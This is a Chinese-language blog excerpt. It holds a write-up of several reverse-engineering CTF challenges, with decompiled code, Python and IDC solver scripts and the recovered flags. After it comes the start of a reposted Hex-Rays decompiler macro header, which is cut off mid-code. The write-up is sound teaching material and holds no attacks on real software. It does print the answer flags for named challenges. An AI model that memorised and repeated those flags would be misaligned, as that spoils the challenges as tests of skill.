    <url>/2020/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>后面的题目也越来越难了，比较难比较复杂的题目会单拉出来写，这里就记录一些比较简单的题目。</p><a id="more"></a><h4 id="easy-Maze"><a href="#easy-Maze" class="headerlink" title="easy_Maze"></a>easy_Maze</h4><p>看名字就知道是个迷宫题，IDA打开看看</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // rax  int v5[7]; // [rsp+0h] [rbp-270h]  int v6; // [rsp+C0h] [rbp-1B0h]  int v7[7]; // [rsp+D0h] [rbp-1A0h]  int v8; // [rsp+190h] [rbp-E0h]  int v9[7]; // [rsp+1A0h] [rbp-D0h]  int v10; // [rsp+1BCh] [rbp-B4h]  int v11; // [rsp+1C0h] [rbp-B0h]  int v12; // [rsp+1C4h] [rbp-ACh]  int v13; // [rsp+1C8h] [rbp-A8h]  int v14; // [rsp+1CCh] [rbp-A4h]  int v15; // [rsp+1D0h] [rbp-A0h]  int v16; // [rsp+1D4h] [rbp-9Ch]  int v17; // [rsp+1D8h] [rbp-98h]  int v18; // [rsp+1DCh] [rbp-94h]  int v19; // [rsp+1E0h] [rbp-90h]  int v20; // [rsp+1E4h] [rbp-8Ch]  int v21; // [rsp+1E8h] [rbp-88h]  int v22; // [rsp+1ECh] [rbp-84h]  int v23; // [rsp+1F0h] [rbp-80h]  int v24; // [rsp+1F4h] [rbp-7Ch]  int v25; // [rsp+1F8h] [rbp-78h]  int v26; // [rsp+1FCh] [rbp-74h]  int v27; // [rsp+200h] [rbp-70h]  int v28; // [rsp+204h] [rbp-6Ch]  int v29; // [rsp+208h] [rbp-68h]  int v30; // [rsp+20Ch] [rbp-64h]  int v31; // [rsp+210h] [rbp-60h]  int v32; // [rsp+214h] [rbp-5Ch]  int v33; // [rsp+218h] [rbp-58h]  int v34; // [rsp+21Ch] [rbp-54h]  int v35; // [rsp+220h] [rbp-50h]  int v36; // [rsp+224h] [rbp-4Ch]  int v37; // [rsp+228h] [rbp-48h]  int v38; // [rsp+22Ch] [rbp-44h]  int v39; // [rsp+230h] [rbp-40h]  int v40; // [rsp+234h] [rbp-3Ch]  int v41; // [rsp+238h] [rbp-38h]  int v42; // [rsp+23Ch] [rbp-34h]  int v43; // [rsp+240h] [rbp-30h]  int v44; // [rsp+244h] [rbp-2Ch]  int v45; // [rsp+248h] [rbp-28h]  int v46; // [rsp+24Ch] [rbp-24h]  int v47; // [rsp+250h] [rbp-20h]  int v48; // [rsp+254h] [rbp-1Ch]  int v49; // [rsp+258h] [rbp-18h]  int v50; // [rsp+25Ch] [rbp-14h]  int v51; // [rsp+260h] [rbp-10h]  v9[0] = 1;  v9[1] = 1;  v9[2] = -1;  v9[3] = 1;  v9[4] = -1;  v9[5] = 1;  v9[6] = -1;  v10 = 0;  v11 = 0;  v12 = 0;  v13 = 0;  v14 = 1;  v15 = -1;  v16 = 0;  v17 = 0;  v18 = 1;  v19 = 0;  v20 = 0;  v21 = 1;  v22 = 0;  v23 = -1;  v24 = -1;  v25 = 0;  v26 = 1;  v27 = 0;  v28 = 1;  v29 = -1;  v30 = 0;  v31 = -1;  v32 = 0;  v33 = 0;  v34 = 0;  v35 = 0;  v36 = 0;  v37 = 1;  v38 = -1;  v39 = -1;  v40 = 1;  v41 = -1;  v42 = 0;  v43 = -1;  v44 = 2;  v45 = 1;  v46 = -1;  v47 = 0;  v48 = 0;  v49 = -1;  v50 = 1;  v51 = 0;  memset(v7, 0, 0xC0uLL);  v8 = 0;  memset(v5, 0, 0xC0uLL);  v6 = 0;  Step_0((int (*)[7])v9, 7, (int (*)[7])v7);  Step_1((int (*)[7])v7, 7, (int (*)[7])v5);  v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, &quot;Please help me out!&quot;);  std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  Step_2((int (*)[7])v5, 7);  system(&quot;pause&quot;);  return 0;}</code></pre><p>首先新建了三个地图，初始化了其中一个，然后利用下面两步分别初始化另外两个图</p><pre><code class="c++">Step_0((int (*)[7])v9, 7, (int (*)[7])v7);Step_1((int (*)[7])v7, 7, (int (*)[7])v5);</code></pre><p>具体的操作在<code>Step_2((int (*)[7])v5, 7)</code>里，可以看到只用了最后的一个图，可以直接动态调试<code>dump</code>出地图来，然后看一下具体操作</p><pre><code class="c++">__int64 __fastcall Step_2(int (*a1)[7]){  int v1; // eax  __int64 v2; // rax  __int64 v3; // rax  __int64 result; // rax  __int64 v5; // rax  char v6[35]; // [rsp+10h] [rbp-30h]  char v7; // [rsp+33h] [rbp-Dh]  int v8; // [rsp+34h] [rbp-Ch]  int v9; // [rsp+38h] [rbp-8h]  int v10; // [rsp+3Ch] [rbp-4h]  v10 = 0;  v9 = 0;  v8 = 0;  while ( v8 &lt;= 29 &amp;&amp; (*a1)[7 * v10 + v9] == 1 )  {    std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cin, &amp;v7);    v1 = v8++;    v6[v1] = v7;    if ( v7 == 100 )    {      ++v9;    }    else if ( v7 &gt; 100 )    {      if ( v7 == 115 )      {        ++v10;      }      else      {        if ( v7 != 119 )          goto LABEL_14;        --v10;      }    }    else if ( v7 == 97 )    {      --v9;    }    else    {LABEL_14:      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, &quot;include illegal words.&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    }  }  if ( v10 != 6 || v9 != 6 )  {    v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, &quot;Oh no!,Please try again~~&quot;);    std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    result = 0LL;  }  else  {    v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;_bss_start, &quot;Congratulations!&quot;);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    output(v6, v8);    result = 1LL;  }  return result;}</code></pre><p>难度不是很大，经典的<code>wasd</code>，只能经过1的位置，走到最后就可以了，整个路径的操作就是flag，格式为<code>UNCTF{}</code></p><p><code>dump</code>出的地图为</p><pre><code>1 0 0 1 1 1 11 0 1 1 0 0 11 1 1 0 1 1 10 0 0 1 1 0 01 1 1 1 0 0 01 0 0 0 1 1 11 1 1 1 1 0 1</code></pre><p>走出来就可以了</p><pre><code>ssddwdwdddssaasasaaassddddwdds</code></pre><p>验证一下</p><pre><code class="bash">root@rycbar17th:~# ./easy_Maze Please help me out!ssddwdwdddssaasasaaassddddwddsCongratulations!Thanks! Give you a flag: UNCTF{ssddwdwdddssaasasaaassddddwdds}sh: 1: pause: not found</code></pre><p>得到flag</p><pre><code>UNCTF{ssddwdwdddssaasasaaassddddwdds}</code></pre><h4 id="ReverseMe-120"><a href="#ReverseMe-120" class="headerlink" title="ReverseMe-120"></a>ReverseMe-120</h4><p>将输入的字符串进行base64加密然后异或，和明文字符串进行对比</p><pre><code class="c++">if ( v18 &amp;&amp; *v19 &gt;= v13 )  {    v21 = 3;    v14 = 0;    for ( lengtha = 0; v5; --v5 )    {      v15 = *v7;      if ( *v7 != 13 &amp;&amp; v15 != 10 &amp;&amp; v15 != 32 )      {        v16 = byte_414E40[v15];        v21 -= v16 == 64;        v14 = v16 &amp; 0x3F | (v14 &lt;&lt; 6);        if ( ++lengtha == 4 )        {          lengtha = 0;          if ( v21 )            *v12++ = BYTE2(v14);          if ( v21 &gt; 1 )            *v12++ = BYTE1(v14);          if ( v21 &gt; 2 )            *v12++ = v14;        }      }      ++v7;    }</code></pre><p>有很多的无用代码，这里是关键代码，可以看到每四个字节进行了拼接，输出为三个字节，很显然是base64。</p><h4 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h4><p>湖湘杯2018的题目，当时还参加过，那时候连这道题都毫无头绪<del>(真的菜</del></p><p>这就是个简单的换表题，先upx脱个壳</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  int v3; // kr00_4  char Buf; // [esp+4h] [ebp-2Ch]  char Dst; // [esp+5h] [ebp-2Bh]  Buf = 0;  memset(&amp;Dst, 0, 0x27u);  printf(&quot;Welcome The System\nPlease Input Key:&quot;);  gets_s(&amp;Buf, 0x28u);  v3 = strlen(&amp;Buf);  if ( (unsigned int)(v3 - 35) &lt;= 2 )  {    if ( sub_401090((int)&amp;Buf, v3) == 1 )      printf(&quot;Well Done!\n&quot;);    else      printf(&quot;Your Wrong!\n&quot;);  }  return 0;}signed int __fastcall sub_401090(int input, int length){  int _input; // ebx  int index; // edx  char tmp_char; // al  int v6; // esi  int v7; // edi  char v8; // al  int v9; // eax  char v10; // cl  int v11; // eax  int v12; // ecx  _input = input;  if ( length != 35 )    return -1;  index = 0;  while ( 1 )  {    tmp_char = *(_BYTE *)(index + _input);    v6 = (tmp_char &gt;&gt; 4) % 16;    v7 = (16 * tmp_char &gt;&gt; 4) % 16;    v8 = byte_402150[2 * index];    if ( v8 &lt; &#39;0&#39; || v8 &gt; &#39;9&#39; )      v9 = v8 - &#39;W&#39;;    else      v9 = v8 - &#39;0&#39;;    v10 = byte_402151[2 * index];    v11 = 16 * v9;    if ( v10 &lt; &#39;0&#39; || v10 &gt; &#39;9&#39; )      v12 = v10 - &#39;W&#39;;    else      v12 = v10 - &#39;0&#39;;    if ( (unsigned __int8)byte_4021A0[16 * v6 + v7] != ((v11 + v12) ^ 0x19) )      break;    if ( ++index &gt;= 35 )      return 1;  }  return -1;}</code></pre><p>处理了半天，高四位低四位的处理来处理去，最后还要合在一起……</p><pre><code class="python">target = [    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01,    0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D,    0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4,    0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,    0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7,    0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,    0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E,    0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB,    0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB,    0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C,    0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,    0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C,    0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D,    0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A,    0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3,    0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,    0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A,    0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,    0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E,    0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9,    0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9,    0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99,    0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]var = [0x2a, 0x49, 0xf6, 0x9c, 0x38, 0x39, 0x5c, 0xde, 0x96, 0xd6, 0xde, 0x96, 0xd6, 0xf4, 0xe0, 0x25, 0x48, 0x49,       0x54, 0xd6, 0x19, 0x54, 0x48, 0xde, 0xf6, 0xe2, 0xda, 0xd6, 0x77, 0x86, 0xe2, 0x1d, 0x5a, 0xda, 0xe6]flag = &#39;&#39;for i in var:    tmp = target.index(i^0x19)    flag += chr(tmp)print(flag)</code></pre><p>输出flag</p><pre><code>flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</code></pre><h4 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h4><p>又是一道SMC，不知道为什么最近遇到的还是挺多的</p><p>没有任何加密，IDA打开</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [rsp+0h] [rbp-20h]  int v5; // [rsp+18h] [rbp-8h]  int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; i &lt;= 181; ++i )  {    envp = (const char **)(*((unsigned __int8 *)judge + i) ^ 0xCu);    *((_BYTE *)judge + i) ^= 0xCu;  }  printf(&quot;Please input flag:&quot;, argv, envp);  __isoc99_scanf(&quot;%20s&quot;, &amp;s);  v5 = strlen(&amp;s);  if ( v5 == 14 &amp;&amp; (unsigned int)judge((__int64)&amp;s) )    puts(&quot;Right!&quot;);  else    puts(&quot;Wrong!&quot;);  return 0;}</code></pre><p>经典的输入然后验证，不过<code>judge</code>函数是打不开的，看前面的操作，典型的SMC，写个IDC脚本跑一下</p><pre><code class="c++">#include &lt;idc.idc&gt;static main() {    auto judge, addr,tmp;    judge = 0x600B00;    auto i;    for ( i = 0; i &lt;= 181; ++i )    {        addr=judge+i;        tmp=Byte(addr);        tmp=tmp^ 0xC;        PatchByte(addr,tmp);    }    Message(&quot;Down!&quot;);}</code></pre><p>然后改一下<code>judge</code>函数的结束位置，<code>F5</code>分析，逻辑很好懂</p><pre><code class="c++">signed __int64 __fastcall judge(__int64 a1){  __int64 v2; // [rsp-8h] [rbp-8h]  *(&amp;v2 - 5) = a1;  *((_BYTE *)&amp;v2 - 32) = 0x66;  *((_BYTE *)&amp;v2 - 31) = 0x6D;  *((_BYTE *)&amp;v2 - 30) = 0x63;  *((_BYTE *)&amp;v2 - 29) = 0x64;  *((_BYTE *)&amp;v2 - 28) = 0x7F;  *((_BYTE *)&amp;v2 - 27) = 0x6B;  *((_BYTE *)&amp;v2 - 26) = 0x37;  *((_BYTE *)&amp;v2 - 25) = 0x64;  *((_BYTE *)&amp;v2 - 24) = 0x3B;  *((_BYTE *)&amp;v2 - 23) = 0x56;  *((_BYTE *)&amp;v2 - 22) = 0x60;  *((_BYTE *)&amp;v2 - 21) = 0x3B;  *((_BYTE *)&amp;v2 - 20) = 0x6E;  *((_BYTE *)&amp;v2 - 19) = 0x70;  for ( *((_DWORD *)&amp;v2 - 1) = 0; *((_DWORD *)&amp;v2 - 1) &lt;= 13; ++*((_DWORD *)&amp;v2 - 1) )    *(_BYTE *)(*((signed int *)&amp;v2 - 1) + *(&amp;v2 - 5)) ^= *((_DWORD *)&amp;v2 - 1);  for ( *((_DWORD *)&amp;v2 - 1) = 0; *((_DWORD *)&amp;v2 - 1) &lt;= 13; ++*((_DWORD *)&amp;v2 - 1) )  {    if ( *(_BYTE *)(*((signed int *)&amp;v2 - 1) + *(&amp;v2 - 5)) != *((_BYTE *)&amp;v2 + *((signed int *)&amp;v2 - 1) - 32) )      return 0LL;  }  return 1LL;}</code></pre><p>这里其实有三个变量，<code>&amp;v2-1</code>的位置是一个整型，实际上是索引值，<code>&amp;v2-5</code>是我们输入的字符串，<code>&amp;v2-19</code>是最终的目标，只有一个异或操作，很简单就可以跑出来结果</p><pre><code class="python">target = [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x6B, 0x37, 0x64, 0x3B, 0x56, 0x60, 0x3B, 0x6E, 0x70]flag = &#39;&#39;for i in range(14):    flag += chr(target[i] ^ i)print(flag)</code></pre><p>输出flag</p><pre><code>flag{n1c3_j0b}</code></pre><h4 id="What-does-this-button-do"><a href="#What-does-this-button-do" class="headerlink" title="What-does-this-button-do"></a>What-does-this-button-do</h4><p>不知道为什么这题放在了这个位置，简单得不能再简单的一个mobile</p><p>jadx打开，很快就可以找到关键代码</p><pre><code class="java"> public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_flag);        String flag = &quot;&quot;;        int[] d = {102, 108, 97, 103, 123, 119, 52, 110, 110, 52, 95, 106, 52, 114, 95, 109, 121, 95, 100, 51, 120, 125};        for (int i = 0; i &lt; 22; i++) {            flag = flag.concat(String.valueOf((char) d[i]));        }        ((TextView) findViewById(R.id.flagText)).setText(flag);    }</code></pre><p>然后直接输出把flag输出就可以了</p><p>不过这题要去掉外面的<code>flag{}</code>提交</p><pre><code>w4nn4_j4r_my_d3x</code></pre><h4 id="76号"><a href="#76号" class="headerlink" title="76号"></a>76号</h4><p>单字检测，pintools爆破，得到flag</p><p>直接<a href="https://github.com/ChrisTheCoolHut/PinCTF" target="_blank" rel="noopener">滚轮子</a></p><pre><code>flag{09vdf7wefijbk}</code></pre><h4 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h4><p>这题根据名字也知道是go逆向，IDA打开是乱七八糟的函数，也没有任何的symbol，用go重命名的插件给函数重命名，发现一个base64的解码函数和奇怪的字符串，字母表不是很清楚，动态调试一下</p><pre><code class="asm">[-------------------------------------code-------------------------------------]   0x4952dd:    mov    QWORD PTR [rsp],rax   0x4952e1:    mov    QWORD PTR [rsp+0x8],rcx   0x4952e6:    mov    QWORD PTR [rsp+0x10],rdx=&gt; 0x4952eb:    call   0x47e620   0x4952f0:    mov    rax,QWORD PTR [rsp+0x38]   0x4952f5:    mov    rcx,QWORD PTR [rsp+0x30]   0x4952fa:    mov    rdx,QWORD PTR [rsp+0x18]   0x4952ff:    mov    rbx,QWORD PTR [rsp+0x20]No argument[------------------------------------stack-------------------------------------]0000| 0xc000070e90 --&gt; 0xc000074580 (&quot;6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345&quot;, &#39;\377&#39; &lt;repeats 45 times&gt;, &quot;\005\377\377:;&lt;=&gt;?&quot;)0008| 0xc000070e98 --&gt; 0xc000088040 (&quot;tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3&quot;)0016| 0xc000070ea0 --&gt; 0x38 (&#39;8&#39;)0024| 0xc000070ea8 --&gt; 0x40 (&#39;@&#39;)0032| 0xc000070eb0 --&gt; 0xc000088040 (&quot;tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3&quot;)0040| 0xc000070eb8 --&gt; 0x38 (&#39;8&#39;)0048| 0xc000070ec0 --&gt; 0x1 0056| 0xc000070ec8 --&gt; 0x1 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueThread 1 &quot;easyGo&quot; hit Breakpoint 3, 0x00000000004952eb in ?? ()</code></pre><p>找到字母表和密文，解密得到flag</p><pre><code>flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}</code></pre><h4 id="easyCpp"><a href="#easyCpp" class="headerlink" title="easyCpp"></a>easyCpp</h4><p>这题有很多c++标准库的调用，整体来说不是很难，可以通过调试发现每一部分的作用，也不是很难</p><h4 id="re5-packed-movement"><a href="#re5-packed-movement" class="headerlink" title="re5-packed-movement"></a>re5-packed-movement</h4><p>极其无聊的一道题，硬生生用<code>mov</code>实现了所有操作，要求输入<code>flag</code>对比一下，直接<code>objdump</code>就能再汇编代码里找到逐字符将flag移入到某个地址，或者因为是逐字符验证，直接<code>pintools</code>爆破也可以</p><h4 id="the-maya-society"><a href="#the-maya-society" class="headerlink" title="the_maya_society"></a>the_maya_society</h4><p>大致意思就是对当前时间进行一个<code>md5</code>加密，然后和一个字符串连接成目标网址，如果这个目标是对的后面的通信就会得到正确的flag……</p><p>时间应该是2012-12-21</p><h4 id="2ex1"><a href="#2ex1" class="headerlink" title="2ex1"></a>2ex1</h4><p><code>mips</code>，并且<code>strip</code>过，什么信息都没有，打开输出发现很像<code>base64</code>，但应该换过表，<code>ghidra</code>打开找找可疑字符串，发现奇怪的字符串</p><pre><code>@,.1fgvw#`/2ehux$~&quot;3dity%_;4cjsz^+{5bkrA&amp;=}6alqB*-[70mpC()]89noD</code></pre><p>试一试就得到了flag</p><pre><code>flag{change53233}</code></pre><p>对这个字符串表进行交叉引用查询到话也可以找到进行<code>base64</code>编码的函数</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA常用宏定义</title>
    <link href="/2020/03/10/IDA%E5%B8%B8%E7%94%A8%E5%AE%8F%E5%AE%9A%E4%B9%89/"/>
    <url>/2020/03/10/IDA%E5%B8%B8%E7%94%A8%E5%AE%8F%E5%AE%9A%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<p>保存一下便于查询。</p><a id="more"></a><pre><code class="c++">/*   This file contains definitions used by the Hex-Rays decompiler output.   It has type definitions and convenience macros to make the   output more readable.   Copyright (c) 2007-2011 Hex-Rays*/#if defined(__GNUC__)  typedef          long long ll;  typedef unsigned long long ull;  #define __int64 long long  #define __int32 int  #define __int16 short  #define __int8  char  #define MAKELL(num) num ## LL  #define FMT_64 &quot;ll&quot;#elif defined(_MSC_VER)  typedef          __int64 ll;  typedef unsigned __int64 ull;  #define MAKELL(num) num ## i64  #define FMT_64 &quot;I64&quot;#elif defined (__BORLANDC__)  typedef          __int64 ll;  typedef unsigned __int64 ull;  #define MAKELL(num) num ## i64  #define FMT_64 &quot;L&quot;#else  #error &quot;unknown compiler&quot;#endiftypedef unsigned int uint;typedef unsigned char uchar;typedef unsigned short ushort;typedef unsigned long ulong;typedef          char   int8;typedef   signed char   sint8;typedef unsigned char   uint8;typedef          short  int16;typedef   signed short  sint16;typedef unsigned short  uint16;typedef          int    int32;typedef   signed int    sint32;typedef unsigned int    uint32;typedef ll              int64;typedef ll              sint64;typedef ull             uint64;// Partially defined types:#define _BYTE  uint8#define _WORD  uint16#define _DWORD uint32#define _QWORD uint64#if !defined(_MSC_VER)#define _LONGLONG __int128#endif#ifndef _WINDOWS_typedef int8 BYTE;typedef int16 WORD;typedef int32 DWORD;typedef int32 LONG;#endiftypedef int64 QWORD;#ifndef __cplusplustypedef int bool;       // we want to use bool in our C programs#endif// Some convenience macros to make partial accesses nicer// first unsigned macros:#define LOBYTE(x)   (*((_BYTE*)&amp;(x)))   // low byte#define LOWORD(x)   (*((_WORD*)&amp;(x)))   // low word#define LODWORD(x)  (*((_DWORD*)&amp;(x)))  // low dword#define HIBYTE(x)   (*((_BYTE*)&amp;(x)+1))#define HIWORD(x)   (*((_WORD*)&amp;(x)+1))#define HIDWORD(x)  (*((_DWORD*)&amp;(x)+1))#define BYTEn(x, n)   (*((_BYTE*)&amp;(x)+n))#define WORDn(x, n)   (*((_WORD*)&amp;(x)+n))#define BYTE1(x)   BYTEn(x,  1)         // byte 1 (counting from 0)#define BYTE2(x)   BYTEn(x,  2)#define BYTE3(x)   BYTEn(x,  3)#define BYTE4(x)   BYTEn(x,  4)#define BYTE5(x)   BYTEn(x,  5)#define BYTE6(x)   BYTEn(x,  6)#define BYTE7(x)   BYTEn(x,  7)#define BYTE8(x)   BYTEn(x,  8)#define BYTE9(x)   BYTEn(x,  9)#define BYTE10(x)  BYTEn(x, 10)#define BYTE11(x)  BYTEn(x, 11)#define BYTE12(x)  BYTEn(x, 12)#define BYTE13(x)  BYTEn(x, 13)#define BYTE14(x)  BYTEn(x, 14)#define BYTE15(x)  BYTEn(x, 15)#define WORD1(x)   WORDn(x,  1)#define WORD2(x)   WORDn(x,  2)         // third word of the object, unsigned#define WORD3(x)   WORDn(x,  3)#define WORD4(x)   WORDn(x,  4)#define WORD5(x)   WORDn(x,  5)#define WORD6(x)   WORDn(x,  6)#define WORD7(x)   WORDn(x,  7)// now signed macros (the same but with sign extension)#define SLOBYTE(x)   (*((int8*)&amp;(x)))#define SLOWORD(x)   (*((int16*)&amp;(x)))#define SLODWORD(x)  (*((int32*)&amp;(x)))#define SHIBYTE(x)   (*((int8*)&amp;(x)+1))#define SHIWORD(x)   (*((int16*)&amp;(x)+1))#define SHIDWORD(x)  (*((int32*)&amp;(x)+1))#define SBYTEn(x, n)   (*((int8*)&amp;(x)+n))#define SWORDn(x, n)   (*((int16*)&amp;(x)+n))#define SBYTE1(x)   SBYTEn(x,  1)#define SBYTE2(x)   SBYTEn(x,  2)#define SBYTE3(x)   SBYTEn(x,  3)#define SBYTE4(x)   SBYTEn(x,  4)#define SBYTE5(x)   SBYTEn(x,  5)#define SBYTE6(x)   SBYTEn(x,  6)#define SBYTE7(x)   SBYTEn(x,  7)#define SBYTE8(x)   SBYTEn(x,  8)#define SBYTE9(x)   SBYTEn(x,  9)#define SBYTE10(x)  SBYTEn(x, 10)#define SBYTE11(x)  SBYTEn(x, 11)#define SBYTE12(x)  SBYTEn(x, 12)#define SBYTE13(x)  SBYTEn(x, 13)#define SBYTE14(x)  SBYTEn(x, 14)#define SBYTE15(x)  SBYTEn(x, 15)#define SWORD1(x)   SWORDn(x,  1)#define SWORD2(x)   SWORDn(x,  2)#define SWORD3(x)   SWORDn(x,  3)#define SWORD4(x)   SWORDn(x,  4)#define SWORD5(x)   SWORDn(x,  5)#define SWORD6(x)   SWORDn(x,  6)#define SWORD7(x)   SWORDn(x,  7)// Helper functions to represent some assembly instructions.#ifdef __cplusplus// Fill memory block with an integer valueinline void memset32(void *ptr, uint32 value, int count){  uint32 *p = (uint32 *)ptr;  for ( int i=0; i &lt; count; i++ )    *p++ = value;}// Generate a reference to pair of operandstemplate&lt;class T&gt;  int16 __PAIR__( int8  high, T low) { return ((( int16)high) &lt;&lt; sizeof(high)*8) | uint8(low); }template&lt;class T&gt;  int32 __PAIR__( int16 high, T low) { return ((( int32)high) &lt;&lt; sizeof(high)*8) | uint16(low); }template&lt;class T&gt;  int64 __PAIR__( int32 high, T low) { return ((( int64)high) &lt;&lt; sizeof(high)*8) | uint32(low); }template&lt;class T&gt; uint16 __PAIR__(uint8  high, T low) { return (((uint16)high) &lt;&lt; sizeof(high)*8) | uint8(low); }template&lt;class T&gt; uint32 __PAIR__(uint16 high, T low) { return (((uint32)high) &lt;&lt; sizeof(high)*8) | uint16(low); }template&lt;class T&gt; uint64 __PAIR__(uint32 high, T low) { return (((uint64)high) &lt;&lt; sizeof(high)*8) | uint32(low); }// rotate lefttemplate&lt;class T&gt; T __ROL__(T value, uint count){  const uint nbits = sizeof(T) * 8;  count %= nbits;  T high = value &gt;&gt; (nbits - count);  value &lt;&lt;= count;  value |= high;  return value;}// rotate righttemplate&lt;class T&gt; T __ROR__(T value, uint count){  const uint nbits = sizeof(T) * 8;  count %= nbits;  T low = value &lt;&lt; (nbits - count);  value &gt;&gt;= count;  value |= low;  return value;}// carry flag of left shifttemplate&lt;class T&gt; int8 __MKCSHL__(T value, uint count){  const uint nbits = sizeof(T) * 8;  count %= nbits;  return (value &gt;&gt; (nbits-count)) &amp; 1;}// carry flag of right shifttemplate&lt;class T&gt; int8 __MKCSHR__(T value, uint count){  return (value &gt;&gt; (count-1)) &amp; 1;}// sign flagtemplate&lt;class T&gt; int8 __SETS__(T x){  if ( sizeof(T) == 1 )    return int8(x) &lt; 0;  if ( sizeof(T) == 2 )    return int16(x) &lt; 0;  if ( sizeof(T) == 4 )    return int32(x) &lt; 0;  return int64(x) &lt; 0;}// overflow flag of subtraction (x-y)template&lt;class T, class U&gt; int8 __OFSUB__(T x, U y){  if ( sizeof(T) &lt; sizeof(U) )  {    U x2 = x;    int8 sx = __SETS__(x2);    return (sx ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2-y));  }  else  {    T y2 = y;    int8 sx = __SETS__(x);    return (sx ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x-y2));  }}// overflow flag of addition (x+y)template&lt;class T, class U&gt; int8 __OFADD__(T x, U y){  if ( sizeof(T) &lt; sizeof(U) )  {    U x2 = x;    int8 sx = __SETS__(x2);    return ((1 ^ sx) ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2+y));  }  else  {    T y2 = y;    int8 sx = __SETS__(x);    return ((1 ^ sx) ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x+y2));  }}// carry flag of subtraction (x-y)template&lt;class T, class U&gt; int8 __CFSUB__(T x, U y){  int size = sizeof(T) &gt; sizeof(U) ? sizeof(T) : sizeof(U);  if ( size == 1 )    return uint8(x) &lt; uint8(y);  if ( size == 2 )    return uint16(x) &lt; 